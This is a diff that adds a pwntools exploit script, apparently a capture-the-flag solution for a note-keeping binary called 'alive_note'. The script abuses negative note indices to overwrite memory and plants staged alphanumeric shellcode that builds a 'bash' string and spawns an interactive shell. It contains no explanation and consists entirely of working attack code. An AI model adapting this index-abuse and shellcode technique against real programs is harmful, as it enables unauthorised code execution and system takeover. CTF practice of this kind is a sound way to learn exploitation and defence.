@@ -1,0 +1,116 @@
+from pwn import *
+io=process("./alive_note")
+
+def add(index,name):
+    io.sendlineafter("Your choice :","1")
+    io.sendlineafter("Index :",str(index))
+    io.sendlineafter("Name :",name)
+
+def view(index):
+    io.sendlineafter("Your choice :","2")
+    io.sendlineafter("Index :",str(index))
+
+def delete(index):
+    io.sendlineafter("Your choice :","3")
+    io.sendlineafter("Index :",str(index))
+
+def skip():
+    add(-30,"aaaaaaaa")
+    add(-31,"aaaaaaaa")
+    add(-32,"aaaaaaaa")  # aa1u8
+
+# 49 ^ 106 //pop ebx
+
+shell=asm("""
+          push eax
+          push 0x61
+          pop eax
+          xor al,0x61
+""")
+shell+="t8"
+print shell
+add(-27,shell)
+skip()
+
+shell=asm("""
+          push eax
+          dec eax
+          xor ax,0x4f65
+""")
+shell+="u8"
+add(1,shell)
+skip()
+print shell
+
+shell=asm("""
+          xor ax,0x3057
+          pop ecx
+          pop edx
+""")
+
+shell+="u8"
+add(2,shell)
+print shell
+skip()
+
+
+shell=asm("""
+          pop edx
+          pop edx
+          xor word ptr[edx+0x43],ax
+""")
+
+shell+="u8"
+add(3,shell)
+print shell
+skip()
+
+shell=asm("""
+          push ebx
+          push 0x68736162
+""")
+
+shell=shell+"u8"
+add(3,shell)
+skip()
+print shell
+
+shell=asm("""
+          push esp
+          push eax
+          push eax
+          push eax
+          push eax
+""")
+
+shell=shell+"au8"
+add(4,shell)
+skip()
+print shell
+
+shell=asm("""
+          push ecx
+          pop edx
+          push 100
+          pop eax
+          push eax
+""")
+
+shell=shell+"u8"
+add(5,shell)
+skip()
+print shell
+
+shell=asm("""
+          xor al,111
+          push ecx
+""")
+add(6,shell)
+print shell
+
+
+
+gdb.attach(io)
+delete(5)
+
+io.interactive()
